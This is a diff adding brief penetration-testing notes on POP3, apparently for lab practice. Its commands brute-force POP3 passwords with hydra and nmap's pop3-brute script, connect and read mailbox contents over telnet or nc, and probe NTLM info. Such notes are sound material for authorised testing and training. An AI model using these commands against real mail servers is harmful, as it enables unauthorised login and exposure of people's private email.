@@ -1,0 +1,27 @@
+Brute force
+hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V
+hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V
+
+Read mail
+telnet <IP> 110
+
+USER <USER>
+PASS <PASSWORD>
+LIST
+RETR <MAIL_NUMBER>
+QUIT
+
+
+ POP3(110):
+    - connect
+        > nc -nv 10.10.10.51 110
+    - enumerate users
+        - telnet 10.10.10.51 110
+            > USER admin
+            > PASS userpassword
+            > LIST 
+            > RETR 1
+    - brute force
+        - nmap -p 110 --script=pop3-brute 10.10.10.110
+    - ntlm info
+        - nmap -p 110 --script pop3-ntlm-info 10.10.10.51
